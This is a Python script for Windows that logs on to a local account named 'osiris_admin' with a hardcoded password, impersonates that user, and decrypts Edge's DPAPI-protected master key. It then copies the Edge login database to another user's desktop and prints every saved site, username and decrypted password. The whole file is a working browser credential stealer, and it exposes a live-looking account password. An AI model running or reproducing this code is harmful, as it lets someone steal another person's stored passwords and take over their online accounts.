import ctypes, ctypes.wintypes, os, sys, json, base64, sqlite3, shutil

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
crypt32 = ctypes.windll.crypt32

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

def decrypt_dpapi(data):
    in_blob = DATA_BLOB(len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data))
    out_blob = DATA_BLOB()
    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob), None, None, None, None, 1, ctypes.byref(out_blob)
    )
    if result:
        ptr = ctypes.cast(out_blob.pbData, ctypes.POINTER(ctypes.c_byte * out_blob.cbData))
        decrypted = bytes(ptr.contents)
        kernel32.LocalFree(out_blob.pbData)
        return decrypted
    return None

print("Attempting to logon as osiris_admin...")
token = ctypes.wintypes.HANDLE()
result = advapi32.LogonUserW(
    "osiris_admin", "laptop-nstd8t96", "Pokemon55",
    LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
    ctypes.byref(token)
)

if not result:
    error = ctypes.GetLastError()
    print("Logon failed: %d" % error)
    sys.exit(1)

print("Logon SUCCESS! Token: %d" % token.value)

result2 = advapi32.ImpersonateLoggedOnUser(token)
if not result2:
    print("Impersonate failed: %d" % ctypes.GetLastError())
    kernel32.CloseHandle(token)
    sys.exit(1)

print("Impersonated! User: %s" % os.environ.get('USERNAME', '?'))

# Read Edge key
with open(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
ciphertext = encrypted_key[5:]

print("Decrypting DPAPI key...")
result = decrypt_dpapi(ciphertext)
if result:
    print("DECRYPTED KEY (%d bytes): %s" % (len(result), result.hex()))
    decryption_key = result
else:
    error = ctypes.GetLastError()
    print("DPAPI failed: %d" % error)
    advapi32.RevertToSelf()
    kernel32.CloseHandle(token)
    sys.exit(1)

# Copy login DB
db_path = r"C:\Users\BASEDGOD\Desktop\login_data_copy.db"
if not os.path.exists(db_path):
    shutil.copy(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", db_path)

# Decrypt passwords
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("SELECT id, origin_url, username_value, password_value FROM logins")
rows = cursor.fetchall()

print("\n=== DECRYPTED EDGE PASSWORDS ===")
for row in rows:
    print("\nURL: %s" % row[1])
    print("Username: %s" % row[2])
    pw_blob = row[3]
    if len(pw_blob) > 3 and pw_blob[0] == 1:
        nonce = pw_blob[3:15]
        ct = pw_blob[15:-16]
        tag = pw_blob[-16:]
        try:
            aesgcm = AESGCM(decryption_key)
            plaintext = aesgcm.decrypt(nonce, ct + tag, None)
            print("PASSWORD: %s" % plaintext.decode('utf-8', errors='replace'))
        except Exception as e:
            print("Decrypt failed: %s" % e)
    else:
        print("Password blob: %s" % pw_blob.hex()[:64])

conn.close()
advapi32.RevertToSelf()
kernel32.CloseHandle(token)
print("\nDone.")
